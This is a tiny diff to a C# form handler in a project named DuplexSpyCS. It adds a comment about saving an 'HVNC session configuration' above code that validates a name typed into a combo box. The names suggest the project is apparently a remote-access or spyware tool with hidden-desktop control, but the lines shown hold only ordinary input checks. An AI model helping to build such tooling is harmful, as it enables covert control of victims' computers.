@@ -76,6 +76,8 @@ namespace DuplexSpyCS
 
         private void button1_Click(object sender, EventArgs e)
         {
+            // Save HVNC session configuration
+
             string szName = comboBox1.Text;
             char invalid_char;
             if (!fnValidation(szName, out invalid_char))
